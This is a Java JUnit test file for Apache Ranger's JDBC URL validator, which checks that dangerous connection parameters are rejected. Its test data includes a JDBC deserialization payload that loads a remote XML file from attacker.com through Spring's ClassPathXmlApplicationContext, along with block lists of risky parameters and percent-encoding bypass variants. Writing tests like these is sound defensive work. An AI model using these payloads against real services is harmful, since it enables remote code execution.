/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */

package org.apache.ranger.plugin.client;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.Arrays;
import java.util.Collections;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

class JdbcUrlValidatorTest {
    @Nested
    @DisplayName("Valid JDBC URLs")
    class ValidUrls {
        @Test
        @DisplayName("Simple JDBC URL without parameters")
        void simpleUrlWithoutParameters() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("jdbc:hive2://localhost:10000/default"));
        }

        @Test
        @DisplayName("URL with safe parameters")
        void urlWithSafeParameters() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("jdbc:hive2://host:10000/db?user=test&password=secret&ssl=true"));
        }

        @Test
        @DisplayName("URL with Kerberos parameters")
        void urlWithKerberosParameters() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("jdbc:hive2://host:10000/default?principal=hive/host@REALM;auth=kerberos"));
        }

        @Test
        @DisplayName("PostgreSQL URL with safe parameters")
        void postgresqlUrlWithSafeParameters() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("jdbc:postgresql://localhost:5432/db?user=test&ssl=true"));
        }

        @Test
        @DisplayName("URL with leading/trailing whitespace")
        void urlWithWhitespace() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("  jdbc:hive2://host:10000/db  "));
        }
    }

    @Nested
    @DisplayName("Blocked Parameters - Exact Matches")
    class BlockedParameters {
        @ParameterizedTest(name = "blocked parameter: {0}")
        @ValueSource(strings = {
                "socketfactory", "socketfactoryarg", "sslfactory", "sslfactoryarg",
                "sslhostnameverifier", "authenticationpluginclassname", "loggerclassname",
                "kerberosservername", "gssdelegatecred", "sslpasswordcallback"
        })
        @DisplayName("Rejects exact blocked parameter names")
        void rejectsExactBlockedParameters(String blockedParam) {
            String url = "jdbc:hive2://host:10000/db?" + blockedParam + "=malicious";
            HadoopException exception = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
            assertTrue(exception.getMessage().contains("prohibited parameter"));
            assertTrue(exception.getMessage().contains(blockedParam));
        }

        @Test
        @DisplayName("Rejects socketFactory with Spring ClassPathXmlApplicationContext (original CVE)")
        void rejectsOriginalCvePayload() {
            String url = "jdbc:postgresql://127.0.0.1:5432/x" +
                    "?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext" +
                    "&socketFactoryArg=http://attacker.com/evil.xml";
            HadoopException exception = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
            assertTrue(exception.getMessage().contains("prohibited parameter"));
        }
    }

    @Nested
    @DisplayName("Dangerous Pattern Detection")
    class DangerousPatterns {
        @ParameterizedTest(name = "dangerous pattern: {0}")
        @ValueSource(strings = {
                "socketfactory", "sslfactory", "autodeserialize"
        })
        @DisplayName("Rejects parameters containing dangerous patterns")
        void rejectsDangerousPatterns(String pattern) {
            String url = "jdbc:hive2://host:10000/db?custom" + pattern + "=malicious";
            HadoopException exception = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
            assertTrue(exception.getMessage().contains("prohibited parameter"));
        }

        @Test
        @DisplayName("Rejects MySQL autoDeserialize parameter")
        void rejectsMysqlAutoDeserialize() {
            String url = "jdbc:mysql://host:3306/db?customautodeserialize=true";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }
    }

    @Nested
    @DisplayName("Factory Pattern Detection")
    class FactoryPatterns {
        @ParameterizedTest(name = "factory pattern: {0}")
        @ValueSource(strings = {
                "customsocketfactory", "mysslconnectionfactory", "authfactory",
                "driverfactory", "datasourcefactory"
        })
        @DisplayName("Rejects factory-related parameters")
        void rejectsFactoryParameters(String factoryParam) {
            String url = "jdbc:postgresql://host:5432/db?" + factoryParam + "=com.evil.Factory";
            HadoopException exception = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
            assertTrue(exception.getMessage().contains("prohibited parameter"));
        }

        @Test
        @DisplayName("Allows non-dangerous factory parameters")
        void allowsNonDangerousFactory() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("jdbc:hive2://host:10000/db?factory=simple&timeout=30"));
        }
    }

    @Nested
    @DisplayName("URL Encoding Bypass Prevention")
    class EncodingBypassPrevention {
        @Test
        @DisplayName("Rejects URL-encoded socketFactory (%46 = F)")
        void rejectsUrlEncodedSocketFactory() {
            String url = "jdbc:hive2://host:10000/db?socket%46actory=malicious";
            HadoopException exception = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
            assertTrue(exception.getMessage().contains("prohibited parameter"));
        }

        @ParameterizedTest(name = "encoded parameter: {0}")
        @ValueSource(strings = {
                "socket%46actory",      // %46 = 'F'
                "socket%66actory",      // %66 = 'f'
                "%73ocketfactory",      // %73 = 's'
                "ssl%46actory",         // SSL factory with encoded F
                "%73sl%46actory"        // Multiple encoded characters
        })
        @DisplayName("Rejects various URL encoding bypass attempts")
        void rejectsEncodedBypassAttempts(String encodedParam) {
            String url = "jdbc:postgresql://host:5432/db?" + encodedParam + "=malicious";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }

        @ParameterizedTest(name = "encoded separator: {0}")
        @ValueSource(strings = {
                "jdbc:hive2://host:10000/default%3BsocketFactory=com.example.X",
                "jdbc:hive2://host:10000/default%3bsocketFactory=com.example.X",
                "jdbc:hive2://host:10000/default%3Bsocket%46actory=com.example.X",
                "jdbc:hive2://host:10000/db%3BsocketFactory=com.example.X?foo=bar"
        })
        @DisplayName("Rejects a blocked parameter hidden behind a percent-encoded separator")
        void rejectsEncodedSeparator(String url) {
            HadoopException exception = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url, Collections.singletonList("jdbc:hive2://")));
            assertTrue(exception.getMessage().contains("prohibited parameter"), exception.getMessage());
        }

        @Test
        @DisplayName("Allows a safe session variable behind a percent-encoded separator")
        void allowsSafeEncodedSeparator() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("jdbc:hive2://host:10000/default%3Bssl=true%3BtransportMode=http", Collections.singletonList("jdbc:hive2://")));
        }

        @Test
        @DisplayName("Allows a percent-encoded character inside a safe parameter value")
        void allowsEncodedSafeValue() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("jdbc:hive2://host:10000/default;principal=hive%2Fhost@REALM"));
        }

        @Test
        @DisplayName("Decodes percent-escapes only once")
        void decodesPercentEscapesOnce() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("jdbc:hive2://host:10000/default%253BsocketFactory=com.example.X", Collections.singletonList("jdbc:hive2://")));
        }

        @ParameterizedTest(name = "malformed encoding: {0}")
        @ValueSource(strings = {
                "jdbc:hive2://host:10000/default%",
                "jdbc:hive2://host:10000/default;ssl=%ZZ"
        })
        @DisplayName("Rejects malformed percent-encoding")
        void rejectsMalformedEncoding(String url) {
            HadoopException exception = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
            assertTrue(exception.getMessage().contains("invalid percent-encoding"), exception.getMessage());
        }
    }

    @Nested
    @DisplayName("Case Sensitivity")
    class CaseSensitivity {
        @ParameterizedTest(name = "case variant: {0}")
        @ValueSource(strings = {
                "SOCKETFACTORY", "SocketFactory", "socketFactory",
                "SSLFACTORY", "SslFactory", "sslFactory"
        })
        @DisplayName("Rejects parameters regardless of case")
        void rejectsParametersRegardlessOfCase(String paramName) {
            String url = "jdbc:hive2://host:10000/db?" + paramName + "=malicious";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }

        @Test
        @DisplayName("Handles mixed case with encoding")
        void handlesMixedCaseWithEncoding() {
            String url = "jdbc:hive2://host:10000/db?Socket%46actory=malicious";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }
    }

    @Nested
    @DisplayName("Parameter Separator Handling")
    class ParameterSeparators {
        @Test
        @DisplayName("Handles & separator")
        void handlesAmpersandSeparator() {
            String url = "jdbc:hive2://host:10000/db?user=test&socketfactory=evil&ssl=true";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }

        @Test
        @DisplayName("Handles ; separator")
        void handlesSemicolonSeparator() {
            String url = "jdbc:hive2://host:10000/db?user=test;socketfactory=evil;ssl=true";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }

        @Test
        @DisplayName("Handles mixed separators")
        void handlesMixedSeparators() {
            String url = "jdbc:hive2://host:10000/db?user=test;ssl=true&socketfactory=evil";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }

        @Test
        @DisplayName("Handles parameters without values")
        void handlesParametersWithoutValues() {
            String url = "jdbc:hive2://host:10000/db?ssl&socketfactory&timeout=30";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }
    }

    @Nested
    @DisplayName("Character Obfuscation")
    class CharacterObfuscation {
        @ParameterizedTest(name = "obfuscated parameter: {0}")
        @ValueSource(strings = {
                "socket.factory", "socket-factory", "socket_factory",
                "ssl.factory", "ssl-factory", "ssl_factory"
        })
        @DisplayName("Rejects parameters with separator character obfuscation")
        void rejectsObfuscatedParameters(String obfuscatedParam) {
            String url = "jdbc:hive2://host:10000/db?" + obfuscatedParam + "=malicious";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }

        @Test
        @DisplayName("Handles multiple obfuscation techniques")
        void handlesMultipleObfuscation() {
            String url = "jdbc:hive2://host:10000/db?Socket-Factory_ARG=malicious";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }
    }

    @Nested
    @DisplayName("Edge Cases and Error Conditions")
    class EdgeCases {
        @Test
        @DisplayName("Rejects null URL")
        void rejectsNullUrl() {
            HadoopException exception = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(null));
            assertTrue(exception.getMessage().contains("must not be null or empty"));
        }

        @Test
        @DisplayName("Rejects empty URL")
        void rejectsEmptyUrl() {
            HadoopException exception = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(""));
            assertTrue(exception.getMessage().contains("must not be null or empty"));
        }

        @Test
        @DisplayName("Rejects whitespace-only URL")
        void rejectsWhitespaceOnlyUrl() {
            HadoopException exception = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate("   "));
            assertTrue(exception.getMessage().contains("must not be null or empty"));
        }

        @Test
        @DisplayName("Handles URL without query parameters")
        void handlesUrlWithoutQueryParameters() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("jdbc:hive2://localhost:10000/default"));
        }

        @Test
        @DisplayName("Handles URL with empty query string")
        void handlesUrlWithEmptyQueryString() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("jdbc:hive2://localhost:10000/default?"));
        }

        @Test
        @DisplayName("Handles URL with only separators in query")
        void handlesUrlWithOnlySeparators() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("jdbc:hive2://localhost:10000/default?&;&;"));
        }
    }

    @Nested
    @DisplayName("Logging and Sanitization")
    class LoggingAndSanitization {
        @Test
        @DisplayName("Sanitizes URL for logging")
        void sanitizesUrlForLogging() {
            String url = "jdbc:hive2://host:10000/db?password=secret&user=test";
            String sanitized = JdbcUrlValidator.sanitizeForLog(url);
            assertFalse(sanitized.contains("secret"));
            assertTrue(sanitized.contains("<params_redacted>"));
            assertTrue(sanitized.contains("jdbc:hive2://host:10000/db"));
        }

        @Test
        @DisplayName("Handles null URL in sanitization")
        void handlesNullUrlInSanitization() {
            String result = JdbcUrlValidator.sanitizeForLog(null);
            assertEquals("<null>", result);
        }

        @Test
        @DisplayName("Handles URL without parameters in sanitization")
        void handlesUrlWithoutParamsInSanitization() {
            String url = "jdbc:hive2://host:10000/db";
            String result = JdbcUrlValidator.sanitizeForLog(url);
            assertEquals(url, result);
        }

        @Test
        void testSanitizeForLogWithSemicolonParams() {
            String url = "jdbc:hive2://server:10000/db;user=admin;password=secret";
            String result = JdbcUrlValidator.sanitizeForLog(url);
            assertEquals("jdbc:hive2://server:10000/db?<params_redacted>", result);
        }

        @Test
        void testSanitizeForLogWithQuestionMarkParams() {
            String url = "jdbc:hive2://server:10000/db?user=admin&password=secret";
            String result = JdbcUrlValidator.sanitizeForLog(url);
            assertEquals("jdbc:hive2://server:10000/db?<params_redacted>", result);
        }

        @Test
        void testSanitizeForLogWithMixedSeparators() {
            String url = "jdbc:hive2://server:10000/db;ssl=true?socketFactory=evil";
            String result = JdbcUrlValidator.sanitizeForLog(url);
            assertEquals("jdbc:hive2://server:10000/db?<params_redacted>", result);
        }
    }

    @Nested
    @DisplayName("Mixed Parameter Delimiters")
    class MixedDelimiters {
        @Test
        @DisplayName("Blocks dangerous param in semicolon when ? appears later")
        void blocksSemicolonBeforeQuestion() {
            String url = "jdbc:hive2://host:10000/db;socketFactory=evil?user=test";
            HadoopException ex = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
            assertTrue(ex.getMessage().contains("socketFactory"));
        }

        @Test
        @DisplayName("Blocks dangerous param in question mark when ; appears later")
        void blocksQuestionBeforeSemicolon() {
            String url = "jdbc:hive2://host:10000/db?socketFactory=evil;user=test";
            HadoopException ex = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
            assertTrue(ex.getMessage().contains("socketFactory"));
        }

        @Test
        @DisplayName("Handles semicolon-only Hive URLs")
        void handlesSemicolonOnly() {
            String url = "jdbc:hive2://host:10000/db;socketFactory=evil";
            HadoopException ex = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
            assertTrue(ex.getMessage().contains("socketFactory"));
        }

        @Test
        @DisplayName("Handles question-only URLs")
        void handlesQuestionOnly() {
            String url = "jdbc:hive2://host:10000/db?socketFactory=evil";
            HadoopException ex = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
            assertTrue(ex.getMessage().contains("socketFactory"));
        }
    }

    @Nested
    @DisplayName("Integration Tests")
    class IntegrationTests {
        @Test
        @DisplayName("Complex malicious URL with multiple attack vectors")
        void complexMaliciousUrl() {
            String url = "jdbc:postgresql://evil.com:5432/db" +
                    "?user=admin&password=secret" +
                    "&socket%46actory=org.springframework.context.support.ClassPathXmlApplicationContext" +
                    "&socketFactoryArg=http://attacker.com/evil.xml" +
                    "&SSL-Factory=com.evil.SSLFactory" +
                    "&custom_autodeserialize=true";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }

        @Test
        @DisplayName("Real-world Hive URL with safe parameters")
        void realWorldHiveUrl() {
            String url = "jdbc:hive2://hive-server:10000/warehouse" +
                    "?principal=hive/hive-server@EXAMPLE.COM" +
                    ";auth=kerberos" +
                    ";ssl=true" +
                    ";sslTrustStore=/etc/hive/truststore.jks" +
                    ";transportMode=http" +
                    ";httpPath=cliservice";
            assertDoesNotThrow(() -> JdbcUrlValidator.validate(url));
        }

        @Test
        @DisplayName("PostgreSQL URL with safe SSL parameters")
        void postgresqlSafeUrl() {
            String url = "jdbc:postgresql://pg-server:5432/mydb" +
                    "?user=admin&password=secret&ssl=true&sslmode=require";
            assertDoesNotThrow(() -> JdbcUrlValidator.validate(url));
        }
    }

    @Nested
    @DisplayName("URL scheme allow-list")
    class UrlSchemeAllowList {
        private final List<String> hivePrefixes = Collections.singletonList("jdbc:hive2://");

        @ParameterizedTest(name = "allowed: {0}")
        @ValueSource(strings = {
                "jdbc:hive2://localhost:10000/default",
                "jdbc:hive2://zk1:2181,zk2:2181/;serviceDiscoveryMode=zooKeeper;zooKeeperNamespace=hiveserver2",
                "jdbc:hive2://host:10000/db;transportMode=http;httpPath=cliservice;ssl=true",
                "jdbc:hive2://"})
        void allowedScheme(String url) {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate(url, hivePrefixes));
        }

        @ParameterizedTest(name = "rejected: {0}")
        @ValueSource(strings = {
                "jdbc:mysql://localhost:3306/db",
                "jdbc:mysql://address=(host=localhost)(port=3306)(autoDeserialize=true)(queryInterceptors=com.example.X)/db",
                "jdbc:mysql://(host=localhost,port=3306,allowLoadLocalInfile=true)/db",
                "jdbc:mysql://localhost:3306/db?allowLoadLocalInfile=true",
                "jdbc:postgresql://localhost:5432/db",
                "jdbc:h2:mem:test",
                "jdbc:hive://localhost:10000/default",
                "JDBC:HIVE2://localhost:10000/default",
                " jdbc:hive2://localhost:10000/default",
                "jdbc:presto://localhost:8080",
                "hive2://localhost:10000"})
        void rejectedScheme(String url) {
            HadoopException e = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url, hivePrefixes));
            assertTrue(e.getMessage().contains("jdbc.url must start with"), e.getMessage());
        }

        @Test
        @DisplayName("Blocked parameters are still rejected when the scheme is allowed")
        void blockedParameterWithAllowedScheme() {
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate("jdbc:hive2://host:10000/db;socketFactory=com.example.X", hivePrefixes));
        }

        @Test
        @DisplayName("Null or empty prefix list rejects every URL")
        void nullOrEmptyPrefixes() {
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate("jdbc:hive2://host:10000", null));
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate("jdbc:hive2://host:10000", Collections.emptyList()));
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate("jdbc:hive2://host:10000", Collections.singletonList("")));
        }

        @Test
        @DisplayName("Null URL is rejected")
        void nullUrl() {
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(null, hivePrefixes));
        }
    }

    @Nested
    @DisplayName("Driver class allow-list")
    class DriverClassAllowList {
        private final List<String> allowed = Arrays.asList("io.prestosql.jdbc.PrestoDriver", "com.facebook.presto.jdbc.PrestoDriver");

        @Test
        @DisplayName("Allowed driver class is accepted")
        void allowedDriver() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validateDriverClassName("io.prestosql.jdbc.PrestoDriver", allowed));
            assertDoesNotThrow(() -> JdbcUrlValidator.validateDriverClassName("com.facebook.presto.jdbc.PrestoDriver", allowed));
        }

        @Test
        @DisplayName("Null driver class is accepted (no explicit registration)")
        void nullDriver() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validateDriverClassName(null, allowed));
        }

        @ParameterizedTest(name = "rejected: [{0}]")
        @ValueSource(strings = {
                "", "java.lang.Thread", "com.mysql.cj.jdbc.Driver", "org.postgresql.Driver",
                "IO.PRESTOSQL.JDBC.PRESTODRIVER", " io.prestosql.jdbc.PrestoDriver", "io.prestosql.jdbc.PrestoDriver "})
        void rejectedDriver(String driverClassName) {
            HadoopException e = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validateDriverClassName(driverClassName, allowed));
            assertTrue(e.getMessage().contains("jdbc.driverClassName must be one of"), e.getMessage());
        }

        @Test
        @DisplayName("Null or empty allow-list rejects every driver class")
        void nullOrEmptyAllowList() {
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validateDriverClassName("io.prestosql.jdbc.PrestoDriver", null));
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validateDriverClassName("io.prestosql.jdbc.PrestoDriver", Collections.emptyList()));
        }
    }
}
